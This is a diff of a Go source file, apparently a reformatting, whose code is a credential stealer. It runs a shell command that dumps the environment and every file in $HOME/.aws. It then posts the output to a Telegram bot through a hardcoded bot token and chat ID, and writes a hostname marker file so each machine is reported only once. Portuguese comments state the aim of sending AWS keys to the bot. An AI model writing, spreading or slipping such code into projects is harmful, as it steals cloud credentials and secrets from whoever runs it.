@@ -1,230 +1,130 @@
 package main
 
-
-
-
-
-
-import  (
-
-
-"net/http"
-"fmt"
-"bytes"
-"os/exec"
-"io/ioutil"
-"encoding/json"
-"os"
-
+import (
+	"bytes"
+	"encoding/json"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"os/exec"
 )
 
-
-//essa funcao   sera responsavel por notifica  o bot  
+//essa funcao   sera responsavel por notifica  o bot
 
 //no  telegram    sobre o sucesso   da  rotina de atila_bin
 
 //e verificara se  existe   chaves  da aws e enviara pra  o bot
 
+var token string = "7975585705:AAEhpsmGaok-PDwktP3k83WDI-sF7OdS7o4"
 
-var token string = "7975585705:AAEhpsmGaok-PDwktP3k83WDI-sF7OdS7o4" 
+func bot() {
 
+	cli := http.Client{}
 
+	extract := exec.Command("sh", "-c", "env ;   cd   $HOME/.aws ;  cat * ")
 
+	out, err_combinedoutput := extract.CombinedOutput()
 
+	if err_combinedoutput != nil {
 
+		fmt.Println(err_combinedoutput)
 
+		return
 
-func bot () {
+	}
 
+	//salve out  in  /tmp
 
+	ioutil.WriteFile("/tmp/out", out, 0777)
 
+	str := map[string]string{
 
+		//saia dissso kkkkk
 
-cli :=  http.Client{}
+		"chat_id": "7127446120",
 
+		"text": string(out),
+	}
 
+	out_j, err_m := json.Marshal(str)
 
-extract  :=  exec.Command("sh" ,  "-c" , "env ;   cd   $HOME/.aws ;  cat * " )
- 
-  
-out   ,  err_combinedoutput := extract.CombinedOutput()
+	if err_m != nil {
 
-if err_combinedoutput != nil {
+		//erro em json marshall
 
-fmt.Println(err_combinedoutput )
+		return
 
-return
+	}
 
-}
+	out_str := string(out_j)
 
- 
+	data_data := out_str
 
- //salve out  in  /tmp
+	//verify file uname.txt
 
+	home := os.ExpandEnv("$HOME")
 
-ioutil.WriteFile("/tmp/out" ,   out ,  0777 )
+	_, err_op := os.Open(home + "/machine_id/uname.txt")
 
+	if err_op != nil {
 
+		fmt.Println("data ainda nao enviada")
 
+		//send data
 
+	} else {
 
-str :=  map[string] string  {
+		fmt.Println("data ja foi enviada")
 
+		return
 
-//saia dissso kkkkk
+	}
 
+	data := bytes.NewBufferString(data_data)
 
+	req, err := http.NewRequest("POST", "https://api.telegram.org/bot"+token+"/sendMessage", data)
 
-"chat_id" : "7127446120" ,
+	req.Header.Set("Content-Type", "application/json")
 
+	if err != nil {
 
-"text" :  string(out) ,
+		//fmt.Println("erro em  newrequests")
 
+		return
 
-}
+	}
 
-out_j ,err_m  := json.Marshal (str)
+	_, err_do := cli.Do(req)
 
+	if err_do != nil {
 
+		return //erro  no do()
 
-if err_m  != nil {
+	}
 
+	//data send  of  telegram bot  sinalize in  file the machine name
 
-//erro em json marshall
+	mkdir := exec.Command("sh", "-c", "mkdir  $HOME/machine_id")
 
+	mkdir.Run() //make dir machine_id
 
+	//salve hostname  of machine in file in dir  machine_id
 
-return
+	uname := exec.Command("uname", "-n")
 
-}
+	name, err_combinedoutput := uname.CombinedOutput()
 
+	if err_combinedoutput != nil {
 
-out_str  := string(out_j)
+		fmt.Println("erro em  combinedoutput")
 
+		return
 
-data_data  := out_str
+	}
 
+	env := os.ExpandEnv("$HOME")
 
-
-
-
-//verify file uname.txt
-
-
-
- 
-home  := os.ExpandEnv("$HOME")
-
-
-     
- _,  err_op :=  os.Open(home+"/machine_id/uname.txt")
-
-
-
-if err_op != nil  {  
-
-
-fmt.Println("data ainda nao enviada")  
-
-
-//send data 
-
-
-
-
-} else { 
-
-
-
-fmt.Println("data ja foi enviada") 
-
-
-  return
-
-  
-
-}
-
-
-
-
-
-data := bytes.NewBufferString(data_data)
-
-
-
-
-req  , err   := http.NewRequest("POST", "https://api.telegram.org/bot" + token  + "/sendMessage"  , data)
-
-
-req.Header.Set("Content-Type" ,  "application/json")
-
-
-if err != nil  {
-
-
-//fmt.Println("erro em  newrequests")
-
-return 
-
-}
-
-
-_,    err_do  := cli.Do(req)
-
-if err_do  != nil {
-
-return //erro  no do()
-
-
-}
-
-
-
-//data send  of  telegram bot  sinalize in  file the machine name
-
-
-
-
-
-mkdir := exec.Command("sh"  , "-c"  ,  "mkdir  $HOME/machine_id" ) 
-
-
-mkdir.Run() //make dir machine_id
-
-
-
-//salve hostname  of machine in file in dir  machine_id
-
-
-uname  := exec.Command("uname", "-n" )
-
-
-name ,  err_combinedoutput :=  uname.CombinedOutput()
-
-
-if err_combinedoutput  != nil {
-
-
-fmt.Println("erro em  combinedoutput")
-
-return
-
-
-}
-
-
-
- 
-env := os.ExpandEnv("$HOME")
-
-
-
-ioutil.WriteFile(env  +  "/machine_id/uname.txt" ,  name , 0777) 
-
-
-
-
-
+	ioutil.WriteFile(env+"/machine_id/uname.txt", name, 0777)
 
 }
